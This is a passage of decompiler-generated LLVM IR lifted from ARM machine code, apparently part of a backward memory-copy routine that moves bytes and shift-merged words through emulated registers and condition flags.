  %v0_15d2c = phi i32 [ %v0_15d2c.pre, %.thread20 ], [ %v2_15d70, %.thread26 ], [ %v2_15d0c, %dec_label_pc_15d0c ], [ %v2_15ca4, %dec_label_pc_15c9c ], [ %v0_15d2c61, %dec_label_pc_15ed0 ], [ %v0_15d2c60, %dec_label_pc_15e64 ], [ %v0_15d2c59, %dec_label_pc_15df8 ], [ %v7_15d28, %bb142 ]
  %v1_15d2c = add i32 %v0_15d2c, 4
  store i32 %v1_15d2c, i32* @r2, align 4
  %v3_15d2c = sub i32 0, %v0_15d2c
  %v4_15d2c = and i32 %v1_15d2c, %v3_15d2c
  %v5_15d2c = icmp slt i32 %v4_15d2c, 0
  store i1 %v5_15d2c, i1* %cpsr_v.global-to-local, align 1
  %v6_15d2c = icmp slt i32 %v1_15d2c, 0
  store i1 %v6_15d2c, i1* %cpsr_n.global-to-local, align 1
  %v7_15d2c = icmp eq i32 %v1_15d2c, 0
  store i1 %v7_15d2c, i1* @cpsr_z, align 1
  br i1 %v7_15d2c, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_15d34 = add i32 %v0_15d2c, 2
  %v3_15d34 = sub i32 -3, %v0_15d2c
  %v4_15d34 = and i32 %v3_15d34, %v1_15d2c
  %v5_15d34 = icmp slt i32 %v4_15d34, 0
  store i1 %v5_15d34, i1* %cpsr_v.global-to-local, align 1
  %v6_15d34 = icmp slt i32 %v1_15d34, 0
  store i1 %v6_15d34, i1* %cpsr_n.global-to-local, align 1
  %v7_15d34 = icmp eq i32 %v1_15d2c, 2
  store i1 %v7_15d34, i1* @cpsr_z, align 1
  %v0_15d38 = load i32, i32* @r1, align 4
  %v1_15d38 = add i32 %v0_15d38, -1
  %v2_15d38 = inttoptr i32 %v1_15d38 to i8*
  %v3_15d38 = load i8, i8* %v2_15d38, align 1
  %v4_15d38 = zext i8 %v3_15d38 to i32
  store i32 %v4_15d38, i32* %r3.global-to-local, align 4
  store i32 %v1_15d38, i32* @r1, align 4
  %v3_15d3c = add i32 %v2_15d30, -1
  %v4_15d3c = inttoptr i32 %v3_15d3c to i8*
  store i8 %v3_15d38, i8* %v4_15d3c, align 1
  %v5_15d3c = load i32, i32* %r0.global-to-local, align 4
  %v6_15d3c = add i32 %v5_15d3c, -1
  store i32 %v6_15d3c, i32* %r0.global-to-local, align 4
  %v0_15d40 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15d40 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15d40 = xor i1 %v0_15d40, %v1_15d40
  br i1 %v2_15d40, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_15d40 = load i32, i32* @r1, align 4
  %v4_15d40 = add i32 %v3_15d40, -1
  %v5_15d40 = inttoptr i32 %v4_15d40 to i8*
  %v6_15d40 = load i8, i8* %v5_15d40, align 1
  %v7_15d40 = zext i8 %v6_15d40 to i32
  store i32 %v7_15d40, i32* %r3.global-to-local, align 4
  store i32 %v4_15d40, i32* @r1, align 4
  %v6_15d44 = add i32 %v5_15d3c, -2
  %v7_15d44 = inttoptr i32 %v6_15d44 to i8*
  store i8 %v6_15d40, i8* %v7_15d44, align 1
  %v8_15d44 = load i32, i32* %r0.global-to-local, align 4
  %v9_15d44 = add i32 %v8_15d44, -1
  store i32 %v9_15d44, i32* %r0.global-to-local, align 4
  %v1_15d48.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15d48.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_15d4c = phi i32 [ %v9_15d44, %bb145 ], [ %v6_15d3c, %bb144 ]
  %v2_15d4c = phi i1 [ %v2_15d48.pre, %bb145 ], [ %v1_15d40, %bb144 ]
  %v1_15d4c = phi i1 [ %v1_15d48.pre, %bb145 ], [ %v0_15d40, %bb144 ]
  %v0_15d48 = load i1, i1* @cpsr_z, align 1
  %v3_15d48 = xor i1 %v2_15d4c, %v1_15d4c
  %v4_15d48 = or i1 %v0_15d48, %v3_15d48
  br i1 %v4_15d48, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_15d48 = load i32, i32* @r1, align 4
  %v6_15d48 = add i32 %v5_15d48, -1
  %v7_15d48 = inttoptr i32 %v6_15d48 to i8*
  %v8_15d48 = load i8, i8* %v7_15d48, align 1
  %v9_15d48 = zext i8 %v8_15d48 to i32
  store i32 %v9_15d48, i32* %r3.global-to-local, align 4
  store i32 %v6_15d48, i32* @r1, align 4
  %v8_15d4c = add i32 %v7_15d4c, -1
  %v9_15d4c = inttoptr i32 %v8_15d4c to i8*
  store i8 %v8_15d48, i8* %v9_15d4c, align 1
  %v10_15d4c = load i32, i32* %r0.global-to-local, align 4
  %v11_15d4c = add i32 %v10_15d4c, -1
  store i32 %v11_15d4c, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_15d54:                               ; preds = %dec_label_pc_15cac
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_15d54 = icmp eq i32 %v1_15cac, 1
  store i1 %v8_15d54, i1* %cpsr_n.global-to-local, align 1
  %v1_15d58 = add i32 %v2_15c9c, -1
  %v2_15d58 = inttoptr i32 %v1_15d58 to i8*
  %v3_15d58 = load i8, i8* %v2_15d58, align 1
  %v4_15d58 = zext i8 %v3_15d58 to i32
  store i32 %v4_15d58, i32* %r3.global-to-local, align 4
  store i32 %v1_15d58, i32* @r1, align 4
  %v3_15d5c = add i32 %v2_15ca0, -1
  %v4_15d5c = inttoptr i32 %v3_15d5c to i8*
  store i8 %v3_15d58, i8* %v4_15d5c, align 1
  %v5_15d5c = load i32, i32* %r0.global-to-local, align 4
  %v6_15d5c = add i32 %v5_15d5c, -1
  store i32 %v6_15d5c, i32* %r0.global-to-local, align 4
  br i1 %v8_15d54, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_15d54
  %v9_15d54 = icmp eq i32 %v1_15cac, 2
  %v6_15d60 = load i32, i32* @r1, align 4
  %v7_15d60 = add i32 %v6_15d60, -1
  %v8_15d60 = inttoptr i32 %v7_15d60 to i8*
  %v9_15d60 = load i8, i8* %v8_15d60, align 1
  %v10_15d60 = zext i8 %v9_15d60 to i32
  store i32 %v10_15d60, i32* %r3.global-to-local, align 4
  store i32 %v7_15d60, i32* @r1, align 4
  %v9_15d64 = add i32 %v5_15d5c, -2
  %v10_15d64 = inttoptr i32 %v9_15d64 to i8*
  store i8 %v9_15d60, i8* %v10_15d64, align 1
  %v11_15d64 = load i32, i32* %r0.global-to-local, align 4
  %v12_15d64 = add i32 %v11_15d64, -1
  store i32 %v12_15d64, i32* %r0.global-to-local, align 4
  br i1 %v9_15d54, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_15d68 = load i32, i32* @r1, align 4
  %v9_15d68 = add i32 %v8_15d68, -1
  %v10_15d68 = inttoptr i32 %v9_15d68 to i8*
  %v11_15d68 = load i8, i8* %v10_15d68, align 1
  %v12_15d68 = zext i8 %v11_15d68 to i32
  store i32 %v12_15d68, i32* %r3.global-to-local, align 4
  store i32 %v9_15d68, i32* @r1, align 4
  %v11_15d6c = add i32 %v11_15d64, -2
  %v12_15d6c = inttoptr i32 %v11_15d6c to i8*
  store i8 %v11_15d68, i8* %v12_15d6c, align 1
  %v13_15d6c = load i32, i32* %r0.global-to-local, align 4
  %v14_15d6c = add i32 %v13_15d6c, -1
  store i32 %v14_15d6c, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_15d54, %bb148
  %v0_15dc832 = phi i32 [ %v12_15d64, %bb147 ], [ %v6_15d5c, %dec_label_pc_15d54 ], [ %v14_15d6c, %bb148 ]
  %v0_15d70 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d70 = load i32, i32* %ip.global-to-local, align 4
  %v2_15d70 = sub i32 %v0_15d70, %v1_15d70
  store i32 %v2_15d70, i32* %r2.global-to-local, align 4
  %v4_15d70 = xor i32 %v1_15d70, %v0_15d70
  %v5_15d70 = xor i32 %v2_15d70, %v0_15d70
  %v6_15d70 = and i32 %v5_15d70, %v4_15d70
  %v7_15d70 = icmp slt i32 %v6_15d70, 0
  store i1 %v7_15d70, i1* %cpsr_v.global-to-local, align 1
  %v8_15d70 = icmp slt i32 %v2_15d70, 0
  store i1 %v8_15d70, i1* %cpsr_n.global-to-local, align 1
  %v5_15d74 = icmp slt i32 %v0_15d70, %v1_15d70
  br i1 %v5_15d74, label %bb143, label %dec_label_pc_15d78

dec_label_pc_15d78:                               ; preds = %.thread26
  %v0_15d78 = load i32, i32* @r1, align 4
  %v1_15d78 = urem i32 %v0_15d78, 4
  store i32 %v1_15d78, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15d78 = icmp eq i32 %v1_15d78, 0
  br i1 %v2_15d78, label %dec_label_pc_15cbc, label %dec_label_pc_15d80

dec_label_pc_15d80:                               ; preds = %dec_label_pc_15cb4, %dec_label_pc_15d78
  %v0_15dc831 = phi i32 [ %v2_15ca0, %dec_label_pc_15cb4 ], [ %v0_15dc832, %dec_label_pc_15d78 ]
  %v0_15e74 = phi i32 [ %v2_15ca4, %dec_label_pc_15cb4 ], [ %v2_15d70, %dec_label_pc_15d78 ]
  %v0_15d80 = phi i32 [ %v2_15c9c, %dec_label_pc_15cb4 ], [ %v0_15d78, %dec_label_pc_15d78 ]
  %v0_15d88 = phi i32 [ %v1_15cb4, %dec_label_pc_15cb4 ], [ %v1_15d78, %dec_label_pc_15d78 ]
  %v1_15d80 = and i32 %v0_15d80, -4
  store i32 %v1_15d80, i32* %r1.global-to-local, align 4
  %v1_15d84 = inttoptr i32 %v1_15d80 to i32*
  %v2_15d84 = load i32, i32* %v1_15d84, align 4
  store i32 %v2_15d84, i32* %r3.global-to-local, align 4
  %v7_15d88 = icmp ult i32 %v0_15d88, 2
  %v2_15e6c = add i32 %v0_15e74, -12
  %v4_15e6c = sub i32 11, %v0_15e74
  %v5_15e6c = and i32 %v4_15e6c, %v0_15e74
  %v6_15e6c = icmp slt i32 %v5_15e6c, 0
  store i1 %v6_15e6c, i1* %cpsr_v.global-to-local, align 1
  %v7_15e6c = icmp slt i32 %v2_15e6c, 0
  store i1 %v7_15e6c, i1* %cpsr_n.global-to-local, align 1
  %v5_15e70 = icmp slt i32 %v0_15e74, 12
  br i1 %v7_15d88, label %dec_label_pc_15e6c, label %dec_label_pc_15d90

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d80
  %v8_15d88 = icmp eq i32 %v0_15d88, 2
  br i1 %v8_15d88, label %dec_label_pc_15e00, label %dec_label_pc_15d94

dec_label_pc_15d94:                               ; preds = %dec_label_pc_15d90
  br i1 %v5_15e70, label %dec_label_pc_15de0, label %dec_label_pc_15d9c

dec_label_pc_15d9c:                               ; preds = %dec_label_pc_15d94
  store i32 %v2_15e6c, i32* %r2.global-to-local, align 4
  %v3_15da0 = load i32, i32* @r4, align 4
  store i32 %v3_15da0, i32* %stack_var_-12, align 4
  %v6_15da0 = load i32, i32* @r5, align 4
  %v8_15da0 = inttoptr i32 %v6_15da0 to i8*
  store i8* %v8_15da0, i8** %stack_var_-8, align 4
  %v11_15da0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15da4.dec_label_pc_15da4_crit_edge, %dec_label_pc_15d9c
  %v0_15dc8 = phi i32 [ %v1_15dc8, %dec_label_pc_15da4.dec_label_pc_15da4_crit_edge ], [ %v0_15dc831, %dec_label_pc_15d9c ]
  %v0_15da8 = phi i32 [ %v0_15da8.pre, %dec_label_pc_15da4.dec_label_pc_15da4_crit_edge ], [ %v1_15d80, %dec_label_pc_15d9c ]
  %v0_15da4 = phi i32 [ %v0_15da4.pre, %dec_label_pc_15da4.dec_label_pc_15da4_crit_edge ], [ %v2_15d84, %dec_label_pc_15d9c ]
  %v3_15da4 = mul i32 %v0_15da4, 256
  store i32 %v3_15da4, i32* %lr.global-to-local, align 4
  %v1_15da8 = add i32 %v0_15da8, -4
  %v2_15da8 = inttoptr i32 %v1_15da8 to i32*
  %v3_15da8 = load i32, i32* %v2_15da8, align 4
  store i32 %v3_15da8, i32* %r3.global-to-local, align 4
  %v4_15da8 = add i32 %v0_15da8, -8
  %v5_15da8 = inttoptr i32 %v4_15da8 to i32*
  %v6_15da8 = load i32, i32* %v5_15da8, align 4
  store i32 %v6_15da8, i32* %r4.global-to-local, align 4
  %v7_15da8 = add i32 %v0_15da8, -12
  %v8_15da8 = inttoptr i32 %v7_15da8 to i32*
  %v9_15da8 = load i32, i32* %v8_15da8, align 4
  store i32 %v9_15da8, i32* %r5.global-to-local, align 4
  %v10_15da8 = add i32 %v0_15da8, -16
  %v11_15da8 = inttoptr i32 %v10_15da8 to i32*
  %v12_15da8 = load i32, i32* %v11_15da8, align 4
  store i32 %v10_15da8, i32* %r1.global-to-local, align 4
  %v4_15dac = udiv i32 %v12_15da8, 16777216
  %v5_15dac = or i32 %v4_15dac, %v3_15da4
  store i32 %v5_15dac, i32* %lr.global-to-local, align 4
  %v3_15db0 = mul i32 %v12_15da8, 256
  %v4_15db4 = udiv i32 %v9_15da8, 16777216
  %v5_15db4 = or i32 %v3_15db0, %v4_15db4
  store i32 %v5_15db4, i32* %ip.global-to-local, align 4
  %v3_15db8 = mul i32 %v9_15da8, 256
  %v4_15dbc = udiv i32 %v6_15da8, 16777216
  %v5_15dbc = or i32 %v3_15db8, %v4_15dbc
  store i32 %v5_15dbc, i32* %r5.global-to-local, align 4
  %v3_15dc0 = mul i32 %v6_15da8, 256
  %v4_15dc4 = udiv i32 %v3_15da8, 16777216
  %v5_15dc4 = or i32 %v3_15dc0, %v4_15dc4
  store i32 %v5_15dc4, i32* %r4.global-to-local, align 4
  %v1_15dc8 = add i32 %v0_15dc8, -16
  %v2_15dc8 = inttoptr i32 %v1_15dc8 to i32*
  store i32 %v5_15dc4, i32* %v2_15dc8, align 4
  %v4_15dc8 = add i32 %v0_15dc8, -12
  %v5_15dc8 = inttoptr i32 %v4_15dc8 to i32*
  %v6_15dc8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15dc8, i32* %v5_15dc8, align 4
  %v7_15dc8 = add i32 %v0_15dc8, -8
  %v8_15dc8 = inttoptr i32 %v7_15dc8 to i32*
  %v9_15dc8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15dc8, i32* %v8_15dc8, align 4
  %v10_15dc8 = add i32 %v0_15dc8, -4
  %v11_15dc8 = inttoptr i32 %v10_15dc8 to i32*
  %v12_15dc8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15dc8, i32* %v11_15dc8, align 4
  store i32 %v1_15dc8, i32* %r0.global-to-local, align 4
  %v0_15dcc = load i32, i32* %r2.global-to-local, align 4
  %v2_15dcc = add i32 %v0_15dcc, -16
  store i32 %v2_15dcc, i32* %r2.global-to-local, align 4
  %v6_15dd0 = icmp slt i32 %v0_15dcc, 16
  br i1 %v6_15dd0, label %dec_label_pc_15dd4, label %dec_label_pc_15da4.dec_label_pc_15da4_crit_edge

dec_label_pc_15da4.dec_label_pc_15da4_crit_edge:  ; preds = %dec_label_pc_15da4
  %v0_15da4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15da8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15dd4:                               ; preds = %dec_label_pc_15da4
  %v2_15dd4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15dd4, i32* @r4, align 4
  %v5_15dd4 = load i8*, i8** %stack_var_-8, align 4
  %v6_15dd4 = ptrtoint i8* %v5_15dd4 to i32
  store i32 %v6_15dd4, i32* @r5, align 4
  store i32 %v11_15da0, i32* @lr, align 4
  %v2_15dd8 = add i32 %v0_15dcc, -4
  store i32 %v2_15dd8, i32* %r2.global-to-local, align 4
  %v4_15dd8 = add i32 %v0_15dcc, 2147483632
  %v5_15dd8 = and i32 %v2_15dd8, %v4_15dd8
  %v6_15dd8 = icmp slt i32 %v5_15dd8, 0
  store i1 %v6_15dd8, i1* %cpsr_v.global-to-local, align 1
  %v7_15dd8 = icmp slt i32 %v2_15dd8, 0
  store i1 %v7_15dd8, i1* %cpsr_n.global-to-local, align 1
  %v5_15ddc = icmp slt i32 %v2_15dcc, -12
  br i1 %v5_15ddc, label %dec_label_pc_15df8, label %dec_label_pc_15de0

dec_label_pc_15de0:                               ; preds = %dec_label_pc_15dd4, %dec_label_pc_15d94, %dec_label_pc_15de0
  %v1_15dec = phi i32 [ %v5_15dec, %dec_label_pc_15de0 ], [ %v1_15dc8, %dec_label_pc_15dd4 ], [ %v0_15dc831, %dec_label_pc_15d94 ]
  %v0_15de0 = load i32, i32* %r3.global-to-local, align 4
  %v3_15de0 = mul i32 %v0_15de0, 256
  store i32 %v3_15de0, i32* %ip.global-to-local, align 4
  %v0_15de4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15de4 = add i32 %v0_15de4, -4
  %v2_15de4 = inttoptr i32 %v1_15de4 to i32*
  %v3_15de4 = load i32, i32* %v2_15de4, align 4
  store i32 %v3_15de4, i32* %r3.global-to-local, align 4
  store i32 %v1_15de4, i32* %r1.global-to-local, align 4
  %v4_15de8 = udiv i32 %v3_15de4, 16777216
  %v5_15de8 = or i32 %v4_15de8, %v3_15de0
  store i32 %v5_15de8, i32* %ip.global-to-local, align 4
  %v2_15dec = add i32 %v1_15dec, -4
  %v3_15dec = inttoptr i32 %v2_15dec to i32*
  store i32 %v5_15de8, i32* %v3_15dec, align 4
  %v4_15dec = load i32, i32* %r0.global-to-local, align 4
  %v5_15dec = add i32 %v4_15dec, -4
  store i32 %v5_15dec, i32* %r0.global-to-local, align 4
  %v0_15df0 = load i32, i32* %r2.global-to-local, align 4
  %v2_15df0 = add i32 %v0_15df0, -4
  store i32 %v2_15df0, i32* %r2.global-to-local, align 4
  %v6_15df4 = icmp slt i32 %v0_15df0, 4
  br i1 %v6_15df4, label %dec_label_pc_15df8.loopexit, label %dec_label_pc_15de0

dec_label_pc_15df8.loopexit:                      ; preds = %dec_label_pc_15de0
  %v4_15df0 = sub i32 3, %v0_15df0
  %v5_15df0 = and i32 %v4_15df0, %v0_15df0
  %v6_15df0 = icmp slt i32 %v5_15df0, 0
  %v7_15df0 = icmp slt i32 %v2_15df0, 0
  store i1 %v6_15df0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15df0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15df8

dec_label_pc_15df8:                               ; preds = %dec_label_pc_15df8.loopexit, %dec_label_pc_15dd4
  %v2_15d3c63 = phi i32 [ %v5_15dec, %dec_label_pc_15df8.loopexit ], [ %v1_15dc8, %dec_label_pc_15dd4 ]
  %v0_15d2c59 = phi i32 [ %v2_15df0, %dec_label_pc_15df8.loopexit ], [ %v2_15dd8, %dec_label_pc_15dd4 ]
  %v0_15df8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15df8 = add i32 %v0_15df8, 3
  store i32 %v1_15df8, i32* @r1, align 4
  br label %bb143

dec_label_pc_15e00:                               ; preds = %dec_label_pc_15d90
  br i1 %v5_15e70, label %dec_label_pc_15e4c, label %dec_label_pc_15e08

dec_label_pc_15e08:                               ; preds = %dec_label_pc_15e00
  store i32 %v2_15e6c, i32* %r2.global-to-local, align 4
  %v3_15e0c = load i32, i32* @r4, align 4
  store i32 %v3_15e0c, i32* %stack_var_-12, align 4
  %v6_15e0c = load i32, i32* @r5, align 4
  %v8_15e0c = inttoptr i32 %v6_15e0c to i8*
  store i8* %v8_15e0c, i8** %stack_var_-8, align 4
  %v11_15e0c = load i32, i32* @lr, align 4
  br label %dec_label_pc_15e10

dec_label_pc_15e10:                               ; preds = %dec_label_pc_15e10.dec_label_pc_15e10_crit_edge, %dec_label_pc_15e08
  %v0_15e34 = phi i32 [ %v1_15e34, %dec_label_pc_15e10.dec_label_pc_15e10_crit_edge ], [ %v0_15dc831, %dec_label_pc_15e08 ]
  %v0_15e14 = phi i32 [ %v0_15e14.pre, %dec_label_pc_15e10.dec_label_pc_15e10_crit_edge ], [ %v1_15d80, %dec_label_pc_15e08 ]
  %v0_15e10 = phi i32 [ %v0_15e10.pre, %dec_label_pc_15e10.dec_label_pc_15e10_crit_edge ], [ %v2_15d84, %dec_label_pc_15e08 ]
  %v3_15e10 = mul i32 %v0_15e10, 65536
  store i32 %v3_15e10, i32* %lr.global-to-local, align 4
  %v1_15e14 = add i32 %v0_15e14, -4
  %v2_15e14 = inttoptr i32 %v1_15e14 to i32*
  %v3_15e14 = load i32, i32* %v2_15e14, align 4
  store i32 %v3_15e14, i32* %r3.global-to-local, align 4
  %v4_15e14 = add i32 %v0_15e14, -8
  %v5_15e14 = inttoptr i32 %v4_15e14 to i32*
  %v6_15e14 = load i32, i32* %v5_15e14, align 4
  store i32 %v6_15e14, i32* %r4.global-to-local, align 4
  %v7_15e14 = add i32 %v0_15e14, -12
  %v8_15e14 = inttoptr i32 %v7_15e14 to i32*
  %v9_15e14 = load i32, i32* %v8_15e14, align 4
  store i32 %v9_15e14, i32* %r5.global-to-local, align 4
  %v10_15e14 = add i32 %v0_15e14, -16
  %v11_15e14 = inttoptr i32 %v10_15e14 to i32*
  %v12_15e14 = load i32, i32* %v11_15e14, align 4
  store i32 %v10_15e14, i32* %r1.global-to-local, align 4
  %v4_15e18 = udiv i32 %v12_15e14, 65536
  %v5_15e18 = or i32 %v4_15e18, %v3_15e10
  store i32 %v5_15e18, i32* %lr.global-to-local, align 4
  %v3_15e1c = mul i32 %v12_15e14, 65536
  %v4_15e20 = udiv i32 %v9_15e14, 65536
  %v5_15e20 = or i32 %v3_15e1c, %v4_15e20
  store i32 %v5_15e20, i32* %ip.global-to-local, align 4
  %v3_15e24 = mul i32 %v9_15e14, 65536
  %v4_15e28 = udiv i32 %v6_15e14, 65536
  %v5_15e28 = or i32 %v3_15e24, %v4_15e28
  store i32 %v5_15e28, i32* %r5.global-to-local, align 4
  %v3_15e2c = mul i32 %v6_15e14, 65536
  %v4_15e30 = udiv i32 %v3_15e14, 65536
  %v5_15e30 = or i32 %v3_15e2c, %v4_15e30
  store i32 %v5_15e30, i32* %r4.global-to-local, align 4
  %v1_15e34 = add i32 %v0_15e34, -16
  %v2_15e34 = inttoptr i32 %v1_15e34 to i32*
  store i32 %v5_15e30, i32* %v2_15e34, align 4
  %v4_15e34 = add i32 %v0_15e34, -12
  %v5_15e34 = inttoptr i32 %v4_15e34 to i32*
  %v6_15e34 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15e34, i32* %v5_15e34, align 4
  %v7_15e34 = add i32 %v0_15e34, -8
  %v8_15e34 = inttoptr i32 %v7_15e34 to i32*
  %v9_15e34 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15e34, i32* %v8_15e34, align 4
  %v10_15e34 = add i32 %v0_15e34, -4
  %v11_15e34 = inttoptr i32 %v10_15e34 to i32*
  %v12_15e34 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15e34, i32* %v11_15e34, align 4
  store i32 %v1_15e34, i32* %r0.global-to-local, align 4
  %v0_15e38 = load i32, i32* %r2.global-to-local, align 4
  %v2_15e38 = add i32 %v0_15e38, -16
  store i32 %v2_15e38, i32* %r2.global-to-local, align 4
  %v6_15e3c = icmp slt i32 %v0_15e38, 16
  br i1 %v6_15e3c, label %dec_label_pc_15e40, label %dec_label_pc_15e10.dec_label_pc_15e10_crit_edge

dec_label_pc_15e10.dec_label_pc_15e10_crit_edge:  ; preds = %dec_label_pc_15e10
  %v0_15e10.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15e14.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15e10

dec_label_pc_15e40:                               ; preds = %dec_label_pc_15e10
  %v2_15e40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15e40, i32* @r4, align 4
  %v5_15e40 = load i8*, i8** %stack_var_-8, align 4
  %v6_15e40 = ptrtoint i8* %v5_15e40 to i32
  store i32 %v6_15e40, i32* @r5, align 4
  store i32 %v11_15e0c, i32* @lr, align 4
  %v2_15e44 = add i32 %v0_15e38, -4
  store i32 %v2_15e44, i32* %r2.global-to-local, align 4
  %v4_15e44 = add i32 %v0_15e38, 2147483632
  %v5_15e44 = and i32 %v2_15e44, %v4_15e44
  %v6_15e44 = icmp slt i32 %v5_15e44, 0
  store i1 %v6_15e44, i1* %cpsr_v.global-to-local, align 1
  %v7_15e44 = icmp slt i32 %v2_15e44, 0
  store i1 %v7_15e44, i1* %cpsr_n.global-to-local, align 1
  %v5_15e48 = icmp slt i32 %v2_15e38, -12
  br i1 %v5_15e48, label %dec_label_pc_15e64, label %dec_label_pc_15e4c

dec_label_pc_15e4c:                               ; preds = %dec_label_pc_15e40, %dec_label_pc_15e00, %dec_label_pc_15e4c
  %v1_15e58 = phi i32 [ %v5_15e58, %dec_label_pc_15e4c ], [ %v1_15e34, %dec_label_pc_15e40 ], [ %v0_15dc831, %dec_label_pc_15e00 ]
  %v0_15e4c = load i32, i32* %r3.global-to-local, align 4
  %v3_15e4c = mul i32 %v0_15e4c, 65536
  store i32 %v3_15e4c, i32* %ip.global-to-local, align 4
  %v0_15e50 = load i32, i32* %r1.global-to-local, align 4
  %v1_15e50 = add i32 %v0_15e50, -4
  %v2_15e50 = inttoptr i32 %v1_15e50 to i32*
  %v3_15e50 = load i32, i32* %v2_15e50, align 4
  store i32 %v3_15e50, i32* %r3.global-to-local, align 4
  store i32 %v1_15e50, i32* %r1.global-to-local, align 4
  %v4_15e54 = udiv i32 %v3_15e50, 65536
  %v5_15e54 = or i32 %v4_15e54, %v3_15e4c
  store i32 %v5_15e54, i32* %ip.global-to-local, align 4
  %v2_15e58 = add i32 %v1_15e58, -4
  %v3_15e58 = inttoptr i32 %v2_15e58 to i32*
  store i32 %v5_15e54, i32* %v3_15e58, align 4
  %v4_15e58 = load i32, i32* %r0.global-to-local, align 4
  %v5_15e58 = add i32 %v4_15e58, -4
  store i32 %v5_15e58, i32* %r0.global-to-local, align 4
  %v0_15e5c = load i32, i32* %r2.global-to-local, align 4
  %v2_15e5c = add i32 %v0_15e5c, -4
  store i32 %v2_15e5c, i32* %r2.global-to-local, align 4
  %v6_15e60 = icmp slt i32 %v0_15e5c, 4
  br i1 %v6_15e60, label %dec_label_pc_15e64.loopexit, label %dec_label_pc_15e4c

dec_label_pc_15e64.loopexit:                      ; preds = %dec_label_pc_15e4c
  %v4_15e5c = sub i32 3, %v0_15e5c
  %v5_15e5c = and i32 %v4_15e5c, %v0_15e5c
  %v6_15e5c = icmp slt i32 %v5_15e5c, 0
  %v7_15e5c = icmp slt i32 %v2_15e5c, 0
  store i1 %v6_15e5c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15e5c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15e64

dec_label_pc_15e64:                               ; preds = %dec_label_pc_15e64.loopexit, %dec_label_pc_15e40
  %v2_15d3c64 = phi i32 [ %v5_15e58, %dec_label_pc_15e64.loopexit ], [ %v1_15e34, %dec_label_pc_15e40 ]
  %v0_15d2c60 = phi i32 [ %v2_15e5c, %dec_label_pc_15e64.loopexit ], [ %v2_15e44, %dec_label_pc_15e40 ]
  %v0_15e64 = load i32, i32* %r1.global-to-local, align 4
  %v1_15e64 = add i32 %v0_15e64, 2
  store i32 %v1_15e64, i32* @r1, align 4
  br label %bb143

dec_label_pc_15e6c:                               ; preds = %dec_label_pc_15d80
  br i1 %v5_15e70, label %dec_label_pc_15eb8, label %dec_label_pc_15e74

dec_label_pc_15e74:                               ; preds = %dec_label_pc_15e6c
  store i32 %v2_15e6c, i32* %r2.global-to-local, align 4
  %v3_15e78 = load i32, i32* @r4, align 4
  store i32 %v3_15e78, i32* %stack_var_-12, align 4
  %v6_15e78 = load i32, i32* @r5, align 4
  %v8_15e78 = inttoptr i32 %v6_15e78 to i8*
  store i8* %v8_15e78, i8** %stack_var_-8, align 4
  %v11_15e78 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15e7c

dec_label_pc_15e7c:                               ; preds = %dec_label_pc_15e7c.dec_label_pc_15e7c_crit_edge, %dec_label_pc_15e74
  %v0_15ea0 = phi i32 [ %v1_15ea0, %dec_label_pc_15e7c.dec_label_pc_15e7c_crit_edge ], [ %v0_15dc831, %dec_label_pc_15e74 ]
  %v0_15e80 = phi i32 [ %v0_15e80.pre, %dec_label_pc_15e7c.dec_label_pc_15e7c_crit_edge ], [ %v1_15d80, %dec_label_pc_15e74 ]
  %v0_15e7c = phi i32 [ %v0_15e7c.pre, %dec_label_pc_15e7c.dec_label_pc_15e7c_crit_edge ], [ %v2_15d84, %dec_label_pc_15e74 ]
  %v3_15e7c = mul i32 %v0_15e7c, 16777216
  store i32 %v3_15e7c, i32* %lr.global-to-local, align 4
  %v1_15e80 = add i32 %v0_15e80, -4
  %v2_15e80 = inttoptr i32 %v1_15e80 to i32*
  %v3_15e80 = load i32, i32* %v2_15e80, align 4
  store i32 %v3_15e80, i32* %r3.global-to-local, align 4
  %v4_15e80 = add i32 %v0_15e80, -8
  %v5_15e80 = inttoptr i32 %v4_15e80 to i32*
  %v6_15e80 = load i32, i32* %v5_15e80, align 4
  store i32 %v6_15e80, i32* %r4.global-to-local, align 4
  %v7_15e80 = add i32 %v0_15e80, -12
  %v8_15e80 = inttoptr i32 %v7_15e80 to i32*
  %v9_15e80 = load i32, i32* %v8_15e80, align 4
  store i32 %v9_15e80, i32* %r5.global-to-local, align 4
  %v10_15e80 = add i32 %v0_15e80, -16
